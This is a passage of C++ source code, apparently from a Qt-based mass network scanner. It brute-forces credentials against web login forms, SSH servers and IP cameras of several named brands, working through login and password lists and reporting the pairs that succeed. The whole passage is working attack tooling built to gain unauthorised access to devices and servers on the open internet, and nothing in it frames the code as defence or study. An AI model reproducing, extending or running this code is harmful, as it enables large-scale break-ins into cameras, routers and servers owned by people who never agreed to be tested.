				strcat(request, "\r\nContent-type: application/x-www-form-urlencoded\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: us-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nConnection: close\r\nContent-Length: ");
				strcat(request, itoa(strlen(argData), b, 10));
				strcat(request, "\r\n\r\n");

				strcat(request, argData);

				if(BALogSwitched) stt->doEmitionBAData("Checked WF: " + QString(ip) + ":" + QString::number(port) + "; login/pass: "+ QString(wfLoginLst[i]) + ":" + QString(wfPassLst[j]) + ";	- Progress: (" + QString::number((passCounter/(double)(MaxWFPass*MaxWFLogin)) * 100).mid(0, 4) + "%)");
				++passCounter;

				if(port == 443) cRes = con._EstablishSSLConnection(ip, port, request, &CSTR);
				else cRes = con._EstablishConnection(ip, port, request, &CSTR);

				if(CSTR.lowerBuff != NULL)
				{
					if(strstri(CSTR.lowerBuff, "501 not implemented") != NULL)
					{
						stt->doEmitionRedFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: 501 Not Implemented.");						
						isActive = 0;
						strcpy(lps.login, "UNKNOWN");
						return lps;
					};
					if(strstri(CSTR.lowerBuff, "404 not found") != NULL)
					{
						stt->doEmitionRedFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: 404 Not Found.");						
						isActive = 0;
						strcpy(lps.login, "UNKNOWN");
						return lps;
					};
					if(strstri(CSTR.lowerBuff, "Access is Denied") == NULL
						&& strstri(CSTR.lowerBuff, "Location:") == NULL
						&& strstri(CSTR.lowerBuff, "Access forbidden") == NULL
						&& strstri(CSTR.lowerBuff, "Authentication required") == NULL
						&& strstri(CSTR.lowerBuff, "invalid") == NULL
						&& strstri(CSTR.lowerBuff, "error") == NULL
						&& strstri(CSTR.lowerBuff, "loginerr") == NULL
						&& strstri(CSTR.lowerBuff, "passerr") == NULL
						&& strstri(CSTR.lowerBuff, "passworderr") == NULL
						&& strstri(CSTR.lowerBuff, "location.href") == NULL
						&& strstri(CSTR.lowerBuff, "location.replace") == NULL
						&& strstri(CSTR.lowerBuff, "top.location") == NULL
						&& strstri(CSTR.lowerBuff, "error_status") == NULL
						&& strstri(CSTR.lowerBuff, "http-equiv=\"refresh\"") == NULL
						&& strstri(CSTR.lowerBuff, "http-equiv = \"refresh\"") == NULL
						&& strstri(CSTR.lowerBuff, "busy") == NULL
						&& strstri(CSTR.lowerBuff, "later") == NULL
						&& strstri(CSTR.lowerBuff, "verification failed") == NULL
						&& strstri(CSTR.lowerBuff, "403 Forbidden") == NULL
						&& strstri(CSTR.lowerBuff, formVal) == NULL
						)
					{
						if(i == 0) 
						{
							ZeroMemory(request, sizeof(request));
							ZeroMemory(argData, sizeof(argData));

							isActive = 0;

							strcpy(lps.login, "UNKNOWN");
							return lps;
						};
						char pass[256] = {0};

						ZeroMemory(pass, sizeof(pass));
						strcpy(pass, ip);
						strcat(pass, " - Web Form password found: ");
						strcat(pass, wfLoginLst[i]);
						strcat(pass, ":");
						strcat(pass, wfPassLst[j]);
						isActive = 0;
#pragma region QTGUI_Area
						stt->doEmition_BAGreenData("[+] " + QString(pass));
#pragma endregion
						strcpy(lps.login, wfLoginLst[i]);
						strcpy(lps.pass, wfPassLst[j]);
						return lps;
					};
				}
				else
				{
					ZeroMemory(request, sizeof(request));
					ZeroMemory(argData, sizeof(argData));

					isActive = 0;

					strcpy(lps.login, "UNKNOWN");
					return lps;
				};
				if(i == 0) ++i;
				ZeroMemory(request, sizeof(request));
				ZeroMemory(argData, sizeof(argData));
			};
			firstCycle = 1;
		};
	}
	else
	{
		stt->doEmitionFoundData("<a href=\"http://" + QString(ip) + ":" + QString::number(port) + "\"><font color=\"#c3c3c3\">" + QString(ip) + ":" + QString::number(port) + "</font></a> - [WF]: Unknown method.");
	};

	ZeroMemory(request, sizeof(request));
	ZeroMemory(argData, sizeof(argData));

	isActive = 0;

	strcpy(lps.login, "UNKNOWN");
	return lps;
};
lopaStr Connector::_WFLobby(char *cookie, char *ip, int port, char *methodVal, char *actionVal, char *userVal, char *passVal, char *formVal)
{
	while(BrutingThrds >= gMaxBrutingThreads) Sleep(700);

	++WF;
	
	BConInc();
	lopaStr res = _WFBrut(cookie, ip, port, methodVal, actionVal, userVal, passVal, formVal);
	BConDec();
	
	return res;
};
#pragma endregion
#pragma region SSH
int _sshConnect(char *user, char *pass, char *host, int port)
{
	char hostStr[128] = {0};
	ZeroMemory(hostStr, sizeof(hostStr));
	strcpy(hostStr, user);
	strcat(hostStr, "@");
	strcat(hostStr, host);

	ssh_session my_ssh_session = ssh_new();
	if (my_ssh_session == NULL)
	{
		ssh_free(my_ssh_session);
		return -1;
	};

	ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, hostStr);
	ssh_options_set(my_ssh_session, SSH_OPTIONS_PORT, &port);
	//ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY, &verbosity);
	//ssh_options_set(my_ssh_session, SSH_OPTIONS_LOG_VERBOSITY_STR, &verbosity);
	//ssh_options_set(my_ssh_session, SSH_OPTIONS_STRICTHOSTKEYCHECK, 0);
	int sshTimeout = gTimeOut + 1;
	ssh_options_set(my_ssh_session, SSH_OPTIONS_TIMEOUT, &sshTimeout);

	int rc = ssh_connect(my_ssh_session);

	if (rc != SSH_OK)
	{
		ssh_disconnect(my_ssh_session);
		ssh_free(my_ssh_session);
		++offlines;
		return -2;
	}
	else
	{
		rc = ssh_userauth_password(my_ssh_session, NULL, pass);
		if (rc != SSH_AUTH_SUCCESS)
		{
			ssh_disconnect(my_ssh_session);
			ssh_free(my_ssh_session);
			return -1;
		};
	};
	ssh_disconnect(my_ssh_session);
	ssh_free(my_ssh_session);
	++ssh;
	return 0;
};
char *_get_ssh_banner(char *ip, int port)
{
	Connector con;
	conSTR CSTR;
	char recvBuff[256] = {0};
	con._EstablishConnection(ip, port, "", &CSTR);
	if(CSTR.lowerBuff != NULL && CSTR.size != 0)
	{
		strncpy(recvBuff, CSTR.lowerBuff, CSTR.size < 256 ? CSTR.size : 256);
	};
	if(CSTR.lowerBuff != NULL) 
	{
		delete []CSTR.lowerBuff;
		CSTR.lowerBuff = NULL;
	};
	return recvBuff;
};
int check_ssh_pass(char *user, char *pass, char *userPass, char *host, int port, conSTR *CSTR, char *banner)
{
	int res = -1;
	if(BALogSwitched) stt->doEmitionBAData("Probing SSH: " + QString(user) + ":" + QString(pass) + "@" + QString(host) + ":" + QString::number(port));
	res = _sshConnect(user, pass, host, port);
	if(res == 0)
	{
		stt->doEmition_BAGreenData("[+] SSH: " + QString(user) + ":" + QString(pass) + "@" + QString(host));
		char goodStr[512] = {0};
		strcpy(goodStr, userPass);
		strcat(goodStr, "@");
		strcat(goodStr, host);
		strcat(goodStr, "|+|");
		strcat(goodStr, banner);
		int bsz = strlen(goodStr);
		CSTR->lowerBuff = new char[bsz + 1];
		ZeroMemory(CSTR->lowerBuff, sizeof(CSTR->lowerBuff));
		CSTR->size = bsz;
		strncpy(CSTR->lowerBuff, goodStr, bsz);
		memset(CSTR->lowerBuff + bsz, '\0', 1);
		return 0;
	};
	return res;
};
int _EstablishSSHConnection(char *host, int port, conSTR *CSTR, char *banner)
{
	CSTR->lowerBuff = NULL;
	CSTR->size = 0;
	char login[32] = {0};
	char pass[32] = {0};
	char temp[64] = {0};
	isActive = 1;
	SSHConInc();
	int sz = 0;
	char *ptr1 = 0;
	int res = -1;
	for(int i = 0; i < MaxSSHPass; ++i)
	{
		if(globalScanFlag == false) break;		
		strcpy(temp, sshlpLst[i]);
		ptr1 = strstr(temp, ":");
		sz = ptr1 - temp;
		strncpy(login, temp, sz);
		strcpy(pass, ptr1 + 1);
		res = check_ssh_pass(login, pass, temp, host, port, CSTR, banner);
		ZeroMemory(login, sizeof(login));
		ZeroMemory(pass, sizeof(pass));
		ZeroMemory(temp, sizeof(temp));
		if(res == 0) 
		{
			SSHConDec();
			isActive = 0;
			return 0;
		}
		else if(res == -2)
		{
			SSHConDec();
			isActive = 0;
			return -2;
		};
		Sleep(500);
	};
	SSHConDec();
	isActive = 0;
	return -1;
};
#pragma endregion
#pragma region IPCAMWeb
int _webLoginSeq(char *request, char *login, char *pass, char *ip, int port, int passCounter, char *type, std::vector<char*> negVector)
{
	char recvBuff[256] = {0};
	char recvBuff2[4096] = {0};

	SOCKET sock;
	sockaddr_in sockAddr;
	int bTO; 
	sockAddr.sin_family = AF_INET;  
	sockAddr.sin_port = htons(port);
	HOSTENT *host;  
#if defined(WIN32)
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.S_un.S_addr = inet_addr(ip);  
	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];  
	else 
	{
		return -1;
	};
#else
	if(inet_addr(ip) != INADDR_NONE) sockAddr.sin_addr.s_addr = inet_addr(ip);  
	else if(host=gethostbyname (ip)) ((unsigned long*) &sockAddr.sin_addr)[0] = ((unsigned long**)host->h_addr_list)[0][0];
	else 
	{
		return -1;
	};
#endif
	sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
	int cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
	int cErrCode = WSAGetLastError();

	while(cErrCode == 10038)
	{
		shutdown(sock, SD_BOTH);
		closesocket(sock);
		sock = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );
		cCode = connect(sock, (sockaddr*)&sockAddr, sizeof(sockAddr));
		cErrCode = WSAGetLastError();
		if(gDebugMode) stt->doEmitionDebugFoundData("[" + QString(type) + "] 10038 occured -- [" + QString(ip) + ":" + QString::number(port) + "]");
	};

	if(cCode != SOCKET_ERROR) 
	{
		int x = 1;
		Activity += strlen(request);

		if(send(sock, request, strlen(request), 0) == SOCKET_ERROR) 	
		{
#pragma region QTGUI_Area
			stt->doEmitionRedFoundData("[" + QString(type) + "] Send error! [" + QString(ip) + "]");
#pragma endregion
			shutdown(sock, SD_BOTH);
			closesocket(sock);
			return 0;
		}
		else 
		{
			if(MapWidgetOpened) stt->doEmitionAddOutData(QString(ip), QString(request));
			int x = 1;
			int xx = 0;
			ZeroMemory(recvBuff2, sizeof(recvBuff2));
			while(xx < 3072)
			{
				ZeroMemory(recvBuff, sizeof(recvBuff));
				x = recvWT(sock, recvBuff, sizeof(recvBuff), gTimeOut + 2, &bTO);
				if(x <= 0) break;
				strncat(recvBuff2, recvBuff, x);
				xx += x;
				Activity += x;
			};
			if(BALogSwitched) stt->doEmitionBAData("Checked " + QString(type) + ": " + QString(ip) + ":" + QString::number(port) + "; login/pass: "+ QString(login) + ":" + QString(pass) + ";	- Progress: (" + QString::number((passCounter/(double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");

			if(MapWidgetOpened) stt->doEmitionAddIncData(QString(ip), QString(recvBuff2));

			bool result = true;
			for(int i = 0; i < negVector.size(); ++i)
			{
				if(strstri(recvBuff2, negVector[i]) != NULL)
				{
					result = false;
					break;
				};
			};

			if(result)
			{
				shutdown(sock, SD_BOTH);
				closesocket(sock);
				return 1;
			};
		};
	};

	shutdown(sock, SD_BOTH);
	closesocket(sock);
	return 0;
};
lopaStr _IPCameraBrute(char *ip, int port, char *SPEC)
{
	lopaStr lps;
	ZeroMemory(lps.login, sizeof(lps.login));
	ZeroMemory(lps.pass, sizeof(lps.pass));
	ZeroMemory(lps.other, sizeof(lps.other));
	char login[128] = {0};
	char pass[128] = {0};
	char request[1024] = {0};
	isActive = 1;
	int passCounter = 1;

	std::vector<char*> negVector;
	if(strcmp(SPEC, "IPC") == 0)
	{
		negVector.push_back("<UserGroup>Invalid</UserGroup>");
	}
	else if(strcmp(SPEC, "GEO") == 0)
	{
		negVector.push_back("Access denied");
		negVector.push_back("ErrNoSuchUsr.htm");
	}
	else if(strcmp(SPEC, "EasyCam") == 0)
	{
		negVector.push_back("Set-Cookie: usrLevel=-1;path=/");
	}
	else if(strcmp(SPEC, "Foscam") == 0)
	{
		negVector.push_back("<result>0</result>");
		negVector.push_back("<result>-1</result>");
		negVector.push_back("<result>-2</result>");
		negVector.push_back("<result>-3</result>");
		negVector.push_back("<result>-4</result>");
		negVector.push_back("<result>-5</result>");
		negVector.push_back("<result>-6</result>");
		negVector.push_back("<result>-7</result>");
	}
	else if(strcmp(SPEC, "AVIOSYS") == 0)
	{
		negVector.push_back("Password Error");
	}
	else if(strcmp(SPEC, "BUFFALO") == 0)
	{
		negVector.push_back("403 Forbidden");
	}
	else
	{
		stt->doEmitionRedFoundData("[_IPCameraBrute] No \"SPEC\" specified!");
		isActive = 0;
		strcpy(lps.login, "UNKNOWN");
		return lps;
	};

	for(int i = 0; i < MaxLogin; i++)
	{
		if(globalScanFlag == false) break;
		if(strcmp(loginLst[i], " ") == 0) continue;
		ZeroMemory(login, sizeof(login));
		strcpy(login, loginLst[i]);
		for(int j = 0; j < MaxPass; j++)
		{
			if(globalScanFlag == false) break;
			if(strcmp(passLst[j], " ") == 0) continue;
			
			ZeroMemory(pass, sizeof(pass));
			strcpy(pass, passLst[j]);

			ZeroMemory(request, sizeof(request));
			if(strcmp(SPEC, "IPC") == 0)
			{
				strcpy(request, "GET /login.xml?user=");
				strcat(request, login);
				strcat(request, "&usr=");
				strcat(request, login);
				strcat(request, "&password=");
				strcat(request, pass);
				strcat(request, "&pwd=");
				strcat(request, pass);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);				
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
					strcat(request, itoa(port, tbuff, 10));
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			}
			else if(strcmp(SPEC, "GEO") == 0)
			{
				strcpy(request, "GET /Login.cgi?username=");
				strcat(request, login);
				strcat(request, "&password=");
				strcat(request, pass);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
					strcat(request, itoa(port, tbuff, 10));
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			}
			else if(strcmp(SPEC, "EasyCam") == 0)
			{
				strcpy(request, "GET /login.xml?user=");
				strcat(request, login);
				strcat(request, "&usr=");
				strcat(request, login);
				strcat(request, "&password=");
				strcat(request, pass);
				strcat(request, "&pwd=");
				strcat(request, pass);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
					strcat(request, itoa(port, tbuff, 10));
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			}
			else if(strcmp(SPEC, "Foscam") == 0)
			{
				strcpy(request, "GET /cgi-bin/CGIProxy.fcgi?usr=");
				strcat(request, login);
				strcat(request, "&pwd=");
				strcat(request, pass);
				strcat(request, "&cmd=logIn&usrName=");
				strcat(request, login);
				strcat(request, "&pwd=");
				strcat(request, pass);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
					strcat(request, itoa(port, tbuff, 10));
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			}
			else if(strcmp(SPEC, "AVIOSYS") == 0)
			{
				strcpy(request, "GET /check_user.html?UserName=");
				strcat(request, login);
				strcat(request, "&PassWord=");
				strcat(request, pass);
				strcat(request, " HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
					strcat(request, itoa(port, tbuff, 10));
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: close\r\n\r\n");
			}
			else if(strcmp(SPEC, "BUFFALO") == 0)
			{
				strcpy(request, "POST /rpc/login HTTP/1.1\r\nHost: ");
				strcat(request, ip);
				if(port != 80){
					strcat(request, ":");
					char tbuff[16] = {0};
					strcat(request, itoa(port, tbuff, 10));
				};
				strcat(request, "\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: en-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nConnection: keep-alive");
				int loginLength = strlen(login);
				int passLength = strlen(pass);
				int sz = loginLength + passLength + strlen("user=&password=");
				char *passString = new char[sz + 1];
				ZeroMemory(passString, sizeof(passString));
				strcpy(passString, "user=");
				strcat(passString, login);
				strcat(passString, "&password=");
				strcat(passString, pass);
				strcat(request, "\r\nContent-Length: ");
				char tempBuff[16] = {0};
				strcat(request, itoa(sz, tempBuff, 10));
				strcat(request, "\r\n\r\n");
				strcat(request, passString);
				delete []passString;
			};

			int res = _webLoginSeq(request, login, pass, ip, port, passCounter, SPEC, negVector);

			if(res == 1)
			{
				isActive = 0;
				strcpy(lps.login, loginLst[i]);
				strcpy(lps.pass, passLst[j]);
				return lps;
			}
			else if(res == -1)
			{
				isActive = 0;
				strcpy(lps.login, "UNKNOWN");
				return lps;
			};
			++passCounter;
		};
	};
	isActive = 0;
	strcpy(lps.login, "UNKNOWN");
	return lps;
};
lopaStr Connector::_IPCameraBLobby(char *ip, int port, char *SPEC)
{
	while(BrutingThrds >= gMaxBrutingThreads) Sleep(1000);

	BConInc();
	lopaStr res = _IPCameraBrute(ip, port, SPEC);
	BConDec();
	
	return res;
};
#pragma endregion
int _pingMyTarget(char *ip)
{
	HANDLE hIcmpFile;
    unsigned long ipaddr = INADDR_NONE;
    DWORD dwRetVal = 0;
    char SendData[32] = "Data Buffer";
    LPVOID ReplyBuffer = NULL;
    DWORD ReplySize = 0;
    
    ipaddr = inet_addr(ip);

    if (ipaddr == INADDR_NONE) 
	{
		stt->doEmitionRedFoundData("[Pinger] INADDR_NONE! [" + QString(ip) + "]");
		return 0;
    }
    
    hIcmpFile = IcmpCreateFile();
    if (hIcmpFile == INVALID_HANDLE_VALUE) 
	{
		stt->doEmitionRedFoundData("[Pinger] Unable to open handle. [" + QString::number(GetLastError()) + "]");
		return 0;
   }    

    ReplySize = sizeof(ICMP_ECHO_REPLY) + sizeof(SendData);
    ReplyBuffer = (VOID*) malloc(ReplySize);
    if (ReplyBuffer == NULL) 
	{
		stt->doEmitionRedFoundData("[Pinger] Unable to allocate memory.");
		return 0;
    }    
    
    
    dwRetVal = IcmpSendEcho(hIcmpFile, ipaddr, SendData, sizeof(SendData), 
        NULL, ReplyBuffer, ReplySize, gPingTimeout);
    if (dwRetVal != 0) {
        PICMP_ECHO_REPLY pEchoReply = (PICMP_ECHO_REPLY)ReplyBuffer;
        struct in_addr ReplyAddr;
        ReplyAddr.S_un.S_addr = pEchoReply->Address;
        printf("\tSent icmp message to %s\n", "127.0.0.1");
        if (dwRetVal > 1) 
		{
			if(gDebugMode) stt->doEmitionYellowFoundData("[Pinger] Received " + QString::number(dwRetVal) + " icmp message responses.");
        }    
        else 
		{    
			if(gDebugMode) stt->doEmitionYellowFoundData("[Pinger] Received " + QString::number(dwRetVal) + " icmp message responses.");
        }    
		
		if(gDebugMode) stt->doEmitionYellowFoundData("[Pinger] Received from: " + QString(inet_ntoa( ReplyAddr )) + "; Status = " + QString::number(pEchoReply->Status) + "; Roundtrip time = " + QString::number(pEchoReply->RoundTripTime) + "ms.");
		return 1;
    }
    else 
	{
        printf("\tCall to IcmpSendEcho failed.\n");
        printf("\tIcmpSendEcho returned error: %ld\n", GetLastError() );
		if(gDebugMode) stt->doEmitionRedFoundData("[Pinger] Call to IcmpSendEcho failed. IcmpSendEcho returned error: " + QString::number(GetLastError()));
		return 0;
    };
};
QString strIP;
QString strPort;
const char *buff1 = "GET / HTTP/1.1\r\nHost: ";
const char *buff2 = "\r\nAccept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Language: us-US,ru;q=0.9,en;q=0.8\r\nAccept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1\r\nAccept-Encoding: text, identity, *;q=0\r\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; us; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11\r\nConnection: close\r\n\r\n";
int Connector::_SSHLobby(char *ip, int port, conSTR *CSTR)
{
	char banner[256] = {0};
	strncpy(banner, _get_ssh_banner(ip, port), 256);
	if(strlen(banner) > 0)
	{
		return _EstablishSSHConnection(ip, port, CSTR, banner);
	};
};
int Connector::_ConnectToPort(char *ip, const char *portC, char *hl)
{	
	if(gPingNScan)
	{
		if(_pingMyTarget(ip) == 0)
		{
			return -2;
		};
	};

	char mes[512] = {0};
	conSTR CSTR;
	CSTR.lowerBuff = NULL;
	CSTR.size = 0;

	int strFlag = 0;
	strcpy(mes, buff1);
	strcat(mes, ip);
	int port = atoi(portC);
	if(port != 80){
		strcat(mes, ":");
		strcat(mes, portC);
	};
	strcat(mes, buff2);
	int cRes;

	if(port == 443)		cRes = _EstablishSSLConnection(ip, port, mes, &CSTR);
	else if(port == 22) cRes = _SSHLobby(ip, port, &CSTR);
	else				cRes = _EstablishConnection(ip, port, mes, &CSTR);
	int size = CSTR.size;

	if(cRes == -2) return -2;

	if(size > 0 && cRes != -1)
	{
		++Alive;
		++found;
		stt->doEmitionChangeParsed(QString::number(saved) + "/" + QString::number(found));

		Lexems lx;
		lx._filler(port, CSTR.lowerBuff, ip, size, &lx, hl);
		delete []CSTR.lowerBuff;
		CSTR.lowerBuff = NULL;
	};

	if(CSTR.lowerBuff != NULL) 
	{
		delete []CSTR.lowerBuff;
		CSTR.lowerBuff = NULL;
	};
	strFlag = 1;
};
